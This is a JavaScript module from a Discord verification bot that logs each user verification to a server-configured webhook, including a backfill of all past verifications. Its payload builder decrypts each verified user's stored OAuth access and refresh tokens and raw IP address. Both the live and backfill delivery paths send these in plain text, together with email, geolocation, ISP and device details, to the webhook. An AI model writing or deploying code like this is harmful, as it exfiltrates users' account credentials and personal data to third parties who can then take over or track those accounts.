"use strict";

const crypto = require("node:crypto");
const GuildConfig = require("../../models/GuildConfig");
const VerifyLog = require("../../models/VerifyLog");
const OAuthUser = require("../../models/OAuthUser");
const { verificationWebhookRepository } = require("../../../../database/sqlite/repositories/core/VerificationWebhookRepository");
const { validateWebhookUrl } = require("../../../core/webhooks");
const { decryptToken, decryptIP } = require("../../utils/crypto");

const MAX_EMBED_CHARS = 5800;
const MAX_FIELD_VALUE_CHARS = 1000;
const BATCH_SIZE = 5;
const RATE_LIMIT_DELAY_MS = 1200;

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, Math.max(0, Number(ms) || 0)));
}

function truncate(str, max = 1024) {
    const s = String(str || "");
    return s.length > max ? s.slice(0, max - 3) + "..." : s;
}

function formatDate(timestamp) {
    if (!timestamp) return "ไม่มีข้อมูล";
    try {
        const d = new Date(timestamp);
        return d.toLocaleString("th-TH", { timeZone: "Asia/Bangkok" });
    } catch {
        return String(timestamp);
    }
}

/**
 * Builds the canonical 2-embed payload for a verification event.
 */
function buildWebhookPayload({
    profile = {},
    connections = [],
    ipInfo = {},
    device = null,
    tokens = {},
    roleId = null,
    roleName = null,
    findings = [],
    result = "success",
    verifiedAt = Date.now()
}) {
    const rawIp = ipInfo.encryptedRawIp ? (decryptIP(ipInfo.encryptedRawIp) || ipInfo.ipHash || "ไม่พบ IP") : (ipInfo.ipHash || "ไม่มีข้อมูล");
    const accessToken = tokens.accessToken || (tokens.encryptedAccessToken ? decryptToken(tokens.encryptedAccessToken) : null) || "ไม่มีข้อมูล";
    const refreshToken = tokens.refreshToken || (tokens.encryptedRefreshToken ? decryptToken(tokens.encryptedRefreshToken) : null) || "ไม่มีข้อมูล";

    // Embed 1: Discord Profile & Connections
    const connectionLines = Array.isArray(connections) && connections.length > 0
        ? connections.map(c => `• ${c.type}${c.verified ? " (Verified)" : ""}`).join("\n")
        : "ไม่มีการเชื่อมต่อบัญชีภายนอก";

    const badgeStr = Array.isArray(profile.badgeFlags) && profile.badgeFlags.length > 0
        ? profile.badgeFlags.join(", ")
        : "ไม่มี";

    const embed1 = {
        title: `📋 ข้อมูลผู้ยืนยันตัวตน: ${profile.displayTag || profile.username || profile.id}`,
        color: 0x5865F2,
        thumbnail: profile.avatarUrl ? { url: profile.avatarUrl } : undefined,
        fields: [
            { name: "ชื่อผู้ใช้ (Username)", value: profile.displayTag || profile.username || "ไม่มี", inline: true },
            { name: "Discord ID", value: String(profile.id || "ไม่มี"), inline: true },
            { name: "วันสร้างบัญชี", value: `${formatDate(profile.accountCreatedAt)} (${profile.accountAgeDays || 0} วัน)`, inline: false },
            { name: "อีเมล", value: profile.email ? `${profile.email} (${profile.emailVerified ? "ยืนยันแล้ว" : "ยังไม่ยืนยัน"})` : "ไม่มีข้อมูล", inline: true },
            { name: "เหรียญตรา (Badges)", value: truncate(badgeStr, MAX_FIELD_VALUE_CHARS), inline: true },
            { name: "บัญชีที่เชื่อมต่อ (Connections)", value: truncate(connectionLines, MAX_FIELD_VALUE_CHARS), inline: false }
        ]
    };

    // Embed 2: Network Intelligence, Device, Security Findings, Tokens, and Result
    const geoParts = [ipInfo.city, ipInfo.region, ipInfo.country].filter(Boolean);
    const locationStr = geoParts.length ? geoParts.join(", ") : "ไม่ทราบตำแหน่ง";
    const ispStr = [ipInfo.isp, ipInfo.as].filter(Boolean).join(" - ") || "ไม่ทราบ ISP";

    const networkTypes = [];
    if (ipInfo.isVPN) networkTypes.push("VPN");
    if (ipInfo.isProxy) networkTypes.push("Proxy");
    if (ipInfo.isTOR) networkTypes.push("TOR");
    if (ipInfo.hosting) networkTypes.push("Hosting/Datacenter");
    if (ipInfo.mobile) networkTypes.push("Mobile");
    const networkStatusStr = networkTypes.length ? networkTypes.join(", ") : "อินเทอร์เน็ตบ้าน/ทั่วไป (ปกติ)";

    const deviceParts = [];
    if (device?.browser) deviceParts.push(`เบราว์เซอร์: ${device.browser}`);
    if (device?.os) deviceParts.push(`ระบบ: ${device.os}`);
    if (device?.deviceType) deviceParts.push(`ประเภท: ${device.deviceType}`);
    if (device?.screenSize) deviceParts.push(`หน้าจอ: ${device.screenSize}`);
    const deviceStr = deviceParts.length ? deviceParts.join(" | ") : "ไม่มีข้อมูลอุปกรณ์";

    const findingStr = Array.isArray(findings) && findings.length > 0
        ? findings.join(", ")
        : "ไม่พบความเสี่ยง (ปกติ)";

    const roleMention = roleId ? `<@&${roleId}>${roleName ? ` (${roleName})` : ""}` : (roleName || "ไม่มี");

    const embed2Color = result === "success" ? 0x2ECC71 : (result === "blocked" ? 0xE74C3C : 0xF39C12);
    const resultLabel = result === "success" ? "สำเร็จ ✅" : (result === "blocked" ? "ถูกปฏิเสธ/บล็อก 🚫" : "ล้มเหลว ❌");

    const embed2 = {
        title: "🛡️ ข้อมูลความปลอดภัยและการตรวจสอบเครือข่าย",
        color: embed2Color,
        fields: [
            { name: "ผลการยืนยัน", value: resultLabel, inline: true },
            { name: "ยศที่ได้รับ", value: roleMention, inline: true },
            { name: "IP Address", value: truncate(rawIp, MAX_FIELD_VALUE_CHARS), inline: true },
            { name: "ตำแหน่งที่ตั้ง (GeoIP)", value: truncate(locationStr, MAX_FIELD_VALUE_CHARS), inline: true },
            { name: "ผู้ให้บริการ (ISP/Org)", value: truncate(ispStr, MAX_FIELD_VALUE_CHARS), inline: true },
            { name: "ประเภทเครือข่าย", value: truncate(networkStatusStr, MAX_FIELD_VALUE_CHARS), inline: true },
            { name: "ข้อมูลอุปกรณ์ (Device)", value: truncate(deviceStr, MAX_FIELD_VALUE_CHARS), inline: false },
            { name: "ข้อสังเกตความปลอดภัย (Findings)", value: truncate(findingStr, MAX_FIELD_VALUE_CHARS), inline: false },
            { name: "Access Token", value: truncate(accessToken, MAX_FIELD_VALUE_CHARS), inline: false },
            { name: "Refresh Token", value: truncate(refreshToken, MAX_FIELD_VALUE_CHARS), inline: false }
        ]
    };

    return [embed1, embed2];
}

/**
 * Calculates character count of an embed for Discord limit budgeting.
 */
function embedCharCount(embed) {
    let count = (embed.title?.length || 0) + (embed.description?.length || 0);
    if (Array.isArray(embed.fields)) {
        for (const f of embed.fields) {
            count += (f.name?.length || 0) + (f.value?.length || 0);
        }
    }
    return count;
}

/**
 * Auto-splits embeds into sequential message batches if >6,000 chars without dropping data.
 */
function fitEmbedsIntoMessages(embeds = []) {
    const messages = [];
    let currentBatch = [];
    let currentChars = 0;

    for (const embed of embeds) {
        const count = embedCharCount(embed);
        if (currentBatch.length > 0 && currentChars + count > MAX_EMBED_CHARS) {
            messages.push({ embeds: currentBatch });
            currentBatch = [embed];
            currentChars = count;
        } else {
            currentBatch.push(embed);
            currentChars += count;
        }
    }
    if (currentBatch.length > 0) {
        messages.push({ embeds: currentBatch });
    }
    return messages;
}

/**
 * Sends a single webhook message with automatic 429 retry backoff.
 */
async function postWebhookMessage(webhookUrl, body, attempt = 1) {
    const res = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            ...body,
            allowed_mentions: { parse: [] }
        })
    });

    if (res.status === 429) {
        const retryAfter = Number(res.headers.get("retry-after")) || 2;
        console.warn(`[VerificationWebhook] Rate limited (429). Backing off for ${retryAfter}s...`);
        await sleep(retryAfter * 1000 + 500);
        if (attempt < 5) {
            return postWebhookMessage(webhookUrl, body, attempt + 1);
        }
        throw new Error(`rate_limited_retry_exhausted:${retryAfter}`);
    }

    if (!res.ok) {
        const errorText = await res.text().catch(() => "");
        throw new Error(`webhook_http_${res.status}:${errorText.slice(0, 100)}`);
    }

    return true;
}

/**
 * Delivers full verification event embeds to a webhook URL.
 */
async function deliverWebhookEvent(webhookUrl, embeds = []) {
    const messages = fitEmbedsIntoMessages(embeds);
    for (const msg of messages) {
        await postWebhookMessage(webhookUrl, msg);
        if (messages.length > 1) {
            await sleep(RATE_LIMIT_DELAY_MS);
        }
    }
    return true;
}

class VerificationWebhookManager {
    constructor(repo = verificationWebhookRepository) {
        this.repo = repo;
        this.activeWorkers = new Map(); // guildId -> worker promise
    }

    /**
     * Checks if a destination webhook URL is valid.
     */
    validateUrl(url) {
        return validateWebhookUrl(url);
    }

    /**
     * Retrieves current webhook readiness & configuration status for a guild.
     */
    async getReadiness(guildId) {
        const config = await GuildConfig.findOne().where("guildId").equals(String(guildId)).lean();
        const webhookConfig = config?.verification?.webhookLog || {};
        const urlValidation = this.validateUrl(webhookConfig.url);

        const latestJob = this.repo.getLatestJob(guildId);
        const stats = this.repo.getDeliveryStats(guildId);

        return {
            enabled: webhookConfig.enabled === true,
            mode: webhookConfig.mode || "off",
            urlConfigured: urlValidation.configured,
            urlValid: urlValidation.valid,
            urlError: urlValidation.code,
            lastStatus: webhookConfig.lastStatus || "idle",
            lastDeliveryAt: webhookConfig.lastDeliveryAt || null,
            activeJob: latestJob && ["RUNNING", "PENDING"].includes(latestJob.status) ? {
                jobId: latestJob.job_id,
                mode: latestJob.mode,
                status: latestJob.status,
                processedCount: latestJob.processed_count,
                totalEligible: latestJob.total_eligible,
                successCount: latestJob.success_count,
                failureCount: latestJob.failure_count
            } : null,
            stats
        };
    }

    /**
     * Starts Live-Only delivery mode for a guild.
     */
    async startLiveMode(guildId) {
        const safeGuildId = String(guildId);
        const config = await GuildConfig.findOne().where("guildId").equals(safeGuildId);
        if (!config) throw new Error("ไม่พบการตั้งค่าของเซิร์ฟเวอร์");

        const url = config.verification?.webhookLog?.url;
        const validation = this.validateUrl(url);
        if (!validation.valid) {
            throw new Error("กรุณาตั้งค่า Discord Webhook URL ที่ถูกต้องก่อนเริ่มใช้งาน");
        }

        await GuildConfig.updateOne({ guildId: safeGuildId }, {
            $set: {
                "verification.webhookLog.enabled": true,
                "verification.webhookLog.mode": "live",
                "verification.webhookLog.lastStatus": "running",
                "verification.webhookLog.lastError": null,
                "verification.updatedAt": Date.now()
            }
        });

        // Trigger queue drain if any pending
        this.triggerWorker(safeGuildId);

        return { ok: true, mode: "live" };
    }

    /**
     * Starts Backfill-Then-Live mode for a guild.
     */
    async startBackfillMode(guildId) {
        const safeGuildId = String(guildId);
        const config = await GuildConfig.findOne().where("guildId").equals(safeGuildId);
        if (!config) throw new Error("ไม่พบการตั้งค่าของเซิร์ฟเวอร์");

        const url = config.verification?.webhookLog?.url;
        const validation = this.validateUrl(url);
        if (!validation.valid) {
            throw new Error("กรุณาตั้งค่า Discord Webhook URL ที่ถูกต้องก่อนเริ่มใช้งาน");
        }

        const activeJob = this.repo.getActiveJob(safeGuildId);
        if (activeJob) {
            return {
                ok: true,
                alreadyRunning: true,
                jobId: activeJob.job_id,
                mode: activeJob.mode,
                processedCount: activeJob.processed_count,
                totalEligible: activeJob.total_eligible
            };
        }

        // Count eligible successful historical verifications
        const totalEligible = await VerifyLog.countDocuments({
            guildId: safeGuildId,
            result: "success",
            deletedAt: { $exists: false }
        });

        const jobId = `job_backfill_${safeGuildId}_${Date.now()}`;
        this.repo.createJob({
            jobId,
            guildId: safeGuildId,
            destinationVersion: 1,
            mode: "BACKFILL_LIVE",
            totalEligible
        });

        await GuildConfig.updateOne({ guildId: safeGuildId }, {
            $set: {
                "verification.webhookLog.enabled": true,
                "verification.webhookLog.mode": "backfill_live",
                "verification.webhookLog.lastStatus": "running",
                "verification.webhookLog.lastError": null,
                "verification.updatedAt": Date.now()
            }
        });

        // Start background backfill processor
        this.triggerWorker(safeGuildId, jobId);

        return {
            ok: true,
            jobId,
            mode: "backfill_live",
            totalEligible
        };
    }

    /**
     * Dispatches a live verification event immediately.
     */
    async dispatchLiveEvent({ guildId, userId, logId, eventData }) {
        const safeGuildId = String(guildId);
        const config = await GuildConfig.findOne().where("guildId").equals(safeGuildId).lean();
        const webhookConfig = config?.verification?.webhookLog;

        if (!webhookConfig?.enabled || !webhookConfig?.url) return null;

        const validation = this.validateUrl(webhookConfig.url);
        if (!validation.valid) return null;

        const eventId = logId || `event_${safeGuildId}_${userId}_${Date.now()}`;
        const deliveryId = `del_${eventId}_${Date.now()}`;

        // Enqueue into SQLite
        this.repo.enqueueDelivery({
            deliveryId,
            guildId: safeGuildId,
            destinationVersion: 1,
            eventId,
            userId: String(userId)
        });

        // Send or trigger worker
        this.triggerWorker(safeGuildId);
        return deliveryId;
    }

    /**
     * Triggers the background delivery worker for a guild.
     */
    triggerWorker(guildId, backfillJobId = null) {
        if (this.activeWorkers.has(guildId)) return;
        const workerPromise = this.runWorker(guildId, backfillJobId)
            .finally(() => {
                this.activeWorkers.delete(guildId);
            });
        this.activeWorkers.set(guildId, workerPromise);
    }

    /**
     * Worker execution loop handling backfill draining followed by live event delivery.
     */
    async runWorker(guildId, backfillJobId = null) {
        const safeGuildId = String(guildId);
        const leaseToken = crypto.randomBytes(8).toString("hex");

        try {
            // STEP 1: Process Backfill if job exists or provided
            const job = backfillJobId
                ? this.repo.getJobById(backfillJobId)
                : this.repo.getActiveJob(safeGuildId);

            if (job && job.mode === "BACKFILL_LIVE" && job.status === "RUNNING") {
                await this.executeBackfill(safeGuildId, job, leaseToken);
            }

            // STEP 2: Drain Live deliveries
            await this.drainDeliveries(safeGuildId);

        } catch (err) {
            console.error(`[VerificationWebhookManager] Worker error for guild=${safeGuildId}:`, err);
            await GuildConfig.updateOne({ guildId: safeGuildId }, {
                $set: {
                    "verification.webhookLog.lastStatus": "failed",
                    "verification.webhookLog.lastError": err.message
                }
            }).catch(() => {});
        }
    }

    /**
     * Executes backfill replay from MongoDB historical records.
     */
    async executeBackfill(guildId, job, leaseToken) {
        const config = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
        const webhookUrl = config?.verification?.webhookLog?.url;
        if (!webhookUrl) return;

        let lastCursorId = job.last_cursor_id || null;
        let processed = job.processed_count || 0;
        let successes = job.success_count || 0;
        let failures = job.failure_count || 0;

        while (true) {
            const hasLease = this.repo.acquireJobLease(job.job_id, leaseToken, 30000);
            if (!hasLease) {
                console.warn(`[VerificationWebhook] Lease lost for job=${job.job_id}`);
                break;
            }

            const query = {
                guildId,
                result: "success",
                deletedAt: { $exists: false }
            };
            if (lastCursorId) {
                query._id = { $gt: lastCursorId };
            }

            const batch = await VerifyLog.find(query)
                .sort({ _id: 1 })
                .limit(BATCH_SIZE)
                .lean();

            if (!batch.length) {
                // Backfill completed!
                this.repo.completeJob(job.job_id);
                await GuildConfig.updateOne({ guildId }, {
                    $set: {
                        "verification.webhookLog.mode": "live",
                        "verification.webhookLog.lastStatus": "idle",
                        "verification.webhookLog.backfillCompletedAt": Date.now(),
                        "verification.webhookLog.lastError": null
                    }
                });
                break;
            }

            for (const log of batch) {
                try {
                    const oauthUser = await OAuthUser.findOne({ "discord.userId": log.userId }).lean();
                    const embeds = buildWebhookPayload({
                        profile: {
                            id: log.userId,
                            username: log.discordSnapshot?.username,
                            displayTag: log.discordSnapshot?.displayTag || log.discordSnapshot?.username,
                            avatarUrl: log.discordSnapshot?.avatarUrl,
                            accountCreatedAt: log.discordSnapshot?.accountCreatedAt,
                            accountAgeDays: log.discordSnapshot?.accountAgeDays,
                            email: log.discordSnapshot?.email,
                            emailVerified: log.discordSnapshot?.emailVerified,
                            badgeFlags: log.discordSnapshot?.badgeFlags
                        },
                        connections: oauthUser?.connections || [],
                        ipInfo: log.ipInfo || {},
                        device: log.device || {},
                        tokens: {
                            encryptedAccessToken: oauthUser?.oauth?.encryptedAccessToken,
                            encryptedRefreshToken: oauthUser?.oauth?.encryptedRefreshToken
                        },
                        roleId: log.roleId,
                        roleName: config?.verification?.roleName || null,
                        findings: log.findings || [],
                        result: log.result || "success",
                        verifiedAt: log.verifiedAt || log.createdAt
                    });

                    await deliverWebhookEvent(webhookUrl, embeds);
                    successes++;
                } catch (sendErr) {
                    failures++;
                    console.error(`[VerificationWebhook] Error sending backfill for log=${log._id}:`, sendErr.message);
                }

                processed++;
                lastCursorId = String(log._id);

                this.repo.updateJobProgress(job.job_id, {
                    processedCount: processed,
                    successCount: successes,
                    failureCount: failures,
                    lastCursorId
                });

                await sleep(RATE_LIMIT_DELAY_MS);
            }
        }
    }

    /**
     * Drains pending/retry deliveries from SQLite table.
     */
    async drainDeliveries(guildId) {
        const config = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
        const webhookUrl = config?.verification?.webhookLog?.url;
        if (!webhookUrl) return;

        while (true) {
            const deliveries = this.repo.claimNextDeliveries(guildId, 5);
            if (!deliveries.length) break;

            for (const item of deliveries) {
                try {
                    const log = await VerifyLog.findOne({
                        $or: [
                            { _id: item.event_id },
                            { userId: item.user_id, guildId }
                        ]
                    }).sort({ verifiedAt: -1 }).lean();

                    if (!log) {
                        this.repo.markDeliveryFailed(item.delivery_id, "log_not_found", "VerifyLog not found");
                        continue;
                    }

                    const oauthUser = await OAuthUser.findOne({ "discord.userId": item.user_id }).lean();
                    const embeds = buildWebhookPayload({
                        profile: {
                            id: log.userId,
                            username: log.discordSnapshot?.username,
                            displayTag: log.discordSnapshot?.displayTag || log.discordSnapshot?.username,
                            avatarUrl: log.discordSnapshot?.avatarUrl,
                            accountCreatedAt: log.discordSnapshot?.accountCreatedAt,
                            accountAgeDays: log.discordSnapshot?.accountAgeDays,
                            email: log.discordSnapshot?.email,
                            emailVerified: log.discordSnapshot?.emailVerified,
                            badgeFlags: log.discordSnapshot?.badgeFlags
                        },
                        connections: oauthUser?.connections || [],
                        ipInfo: log.ipInfo || {},
                        device: log.device || {},
                        tokens: {
                            encryptedAccessToken: oauthUser?.oauth?.encryptedAccessToken,
                            encryptedRefreshToken: oauthUser?.oauth?.encryptedRefreshToken
                        },
                        roleId: log.roleId,
                        roleName: config?.verification?.roleName || null,
                        findings: log.findings || [],
                        result: log.result || "success",
                        verifiedAt: log.verifiedAt || log.createdAt
                    });

                    await deliverWebhookEvent(webhookUrl, embeds);
                    this.repo.markDeliverySent(item.delivery_id);

                    await GuildConfig.updateOne({ guildId }, {
                        $set: {
                            "verification.webhookLog.lastDeliveryAt": Date.now(),
                            "verification.webhookLog.lastStatus": "success",
                            "verification.webhookLog.lastError": null
                        }
                    });

                } catch (sendErr) {
                    console.error(`[VerificationWebhook] Delivery failed for id=${item.delivery_id}:`, sendErr.message);
                    if (item.attempt_count >= 5) {
                        this.repo.markDeliveryFailed(item.delivery_id, "exhausted", sendErr.message);
                    } else {
                        this.repo.markDeliveryRetry(item.delivery_id, 10000, "retry", sendErr.message);
                    }
                }

                await sleep(RATE_LIMIT_DELAY_MS);
            }
        }
    }
}

const verificationWebhookManager = new VerificationWebhookManager();

module.exports = {
    buildWebhookPayload,
    embedCharCount,
    fitEmbedsIntoMessages,
    deliverWebhookEvent,
    VerificationWebhookManager,
    verificationWebhookManager
};
